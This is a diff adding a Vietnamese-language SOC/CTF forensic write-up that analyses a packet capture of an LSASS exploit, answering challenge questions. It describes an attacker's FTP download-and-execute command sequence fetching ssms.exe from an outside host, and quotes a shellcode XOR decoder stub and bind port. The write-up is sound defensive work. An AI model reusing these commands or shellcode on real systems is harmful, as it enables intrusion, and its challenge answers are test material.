@@ -71,3 +71,59 @@ Nhiệm vụ của mình là đóng vai chuyên viên SOC: phân tích lưu lư�
 
 ### Q8: Which protocol did the attacker use to download additional malicious files to the target system?
 
+- Mình truy cập menu `Statistics → Conversations` và chuyển sang tab `TCP`. Tại đây mình phát hiện được ngay sau hai luồng khai thác cổng `445`  , kẻ tấn công (`98.114.205.102:1924`) chủ động kết nối vào cổng lạ `1957` trên máy nạn nhân (`192.150.11.111`). Đây là kết nối điều khiển từ xa thông qua do shellcode mở ra.
+
+<img width="1632" height="207" alt="image" src="https://github.com/user-attachments/assets/792abaa4-6443-4900-839e-3e7ce5cccc7a" />
+
+- Ngay sau đó mình đã xem chi tiết dòng hội thoại Stream ID: 2 này để xem toàn bộ nội dung lệnh được truyền đi. Mình phát hiện được một chuỗi lệnh Windows CMD.
+
+<img width="1151" height="171" alt="image" src="https://github.com/user-attachments/assets/5c9d4c3e-ec1d-4d45-9ae6-3e33a47d94be" />
+
+
+- Kẻ tấn công ghi tham số kết nối vào tệp tạm `o`, dùng lệnh `ftp -n -s:o` để kết nối ngược về `98.114.205.102:8884` , tải tệp mã độc `ssms.exe`, xóa tệp `o` (`del /F /Q o`) để xóa dấu vết rồi thực thi trực tiếp `ssms.exe`.
+
+- Từ đó mình kết luận giao thức kẻ tấn công sử dụng để tải thêm tệp độc hại là `FTP`.
+
+### Q9: What is the name of the downloaded malware?
+
+- Từ kết quả Q8 mình cũng xác định được tên tệp độc hại được tải xuống đó chính là `ssms.exe`
+
+
+### Q10: The attacker's server was listening on a specific port. Provide the port number.
+
+- Cũng từ nội dung Q8 mình ghi nhận được chuỗi lệnh thực thi `open 0.0.0.0 8884`, yêu cầu máy nạn nhân kết nối tới dịch vụ FTP đang mở sẵn trên cổng `8884` của máy chủ tấn công.
+
+### Q11: When was the involved malware first submitted to VirusTotal for analysis? Format: YYYY-MM-DD
+
+- Mình tiếp tục dùng kết quả truy cập `Statistics → Conversations (tab TCP)` và thấy rằng `Stream ID: 4(98.114.205.102:2152 → 192.150.11.111:1080)` có dung lượng lớn đột biến (`173 kB`, `271` gói tin).
+
+<img width="1642" height="202" alt="image" src="https://github.com/user-attachments/assets/b0ba679c-933e-42f7-bbb7-e0f98df76437" />
+
+
+- Mình chọn dòng `Stream ID: 4` để xem chi tiết, sau đó quan sát thấy chữ ký nhận diện tệp thực thi Windows (`MZ`) ngay đầu luồng dữ liệu — xác nhận đây là kênh truyền dữ liệu `Active FTP` đang tải tệp `ssms.exe` về máy nạn nhân.
+
+<img width="1917" height="1007" alt="image" src="https://github.com/user-attachments/assets/ed5c64fd-c706-41e2-9d17-93ee61c6f514" />
+
+- Mình tiếp tục chuyển sang chế độ hiện thị `Raw` để bảo toàn dữ liệu và tải tệp về. Sau đó mình tính hash của file và đưa lên VirusTotal để phân tích. Kết quả tại trường `First Submission`, ghi nhận mẫu mã độc được gửi lên phân tích lần đầu vào lúc `2007-06-27 08:47:05 UTC`.
+
+<img width="697" height="182" alt="image" src="https://github.com/user-attachments/assets/4b440a84-0ddd-45c2-97da-25a85ce580eb" />
+
+### Q12: What is the key used to encode the shellcode?
+
+- Từ bảng `Statistics → Conversations (tab TCP)`,mình xác định phiên kết nối SMB thứ hai `Stream ID: 1 (98.114.205.102:1828 → 192.150.11.111:445`, tổng dung lượng `5111 bytes`) là luồng chứa gói tin khai thác lỗ hổng LSASS (`DsRolerUpgradeDownlevelServer request` tại `Packet 33`).
+
+- Sau đó mình xem chi tiết luồng này và chuyển chế độ hiển thị sang `Hex Dump`.
+
+<img width="1917" height="1007" alt="image" src="https://github.com/user-attachments/assets/7fb5fc31-20d1-4c8e-aa89-a2bde94ccb4e" />
+
+- Từ offset `000003E9` đến `00000489`, xuất hiện dãy byte `90 90 90...` đóng vai trò "đường băng" dẫn con trỏ lệnh CPU trượt an toàn vào đầu đoạn mã thực thi khi kích hoạt tràn bộ đệm.
+- Nối tiếp ngay sau dãy `90` chính là đoạn mã giải mã x86 dài 23 byte không bị mã hóa: `eb 10 5a 4a 33 c9 66 b9 7d 01 80 34 0a 99 e2 fa eb 05 e8 eb ff ff ff`
+
+- Tại dòng `00000499`, cụm 4 byte `80 34 0a 99` dịch sang hợp ngữ là `xor byte ptr [edx+ecx], 0x99`, được nhúng trực tiếp khóa giải mã `0x99` vào câu lệnh để CPU giải mã ngược `381` byte (`0x017d`) shellcode phía sau ngay trong RAM.
+
+### Q13: What is the port number the shellcode binds to?
+
+- Mình sẽ tiếp tục kiểm tra bảng `Statistics → Conversations (tab TCP)`, ghi nhận ngay sau khi gói tin khai thác `Packet 33` (`tcp.stream eq 1`) được thực thi, kẻ tấn công  lập tức mở kết nối TCP tới cổng `1957` trên máy nạn nhân tại `Stream ID: 2`.
+
+### Q14: 
+
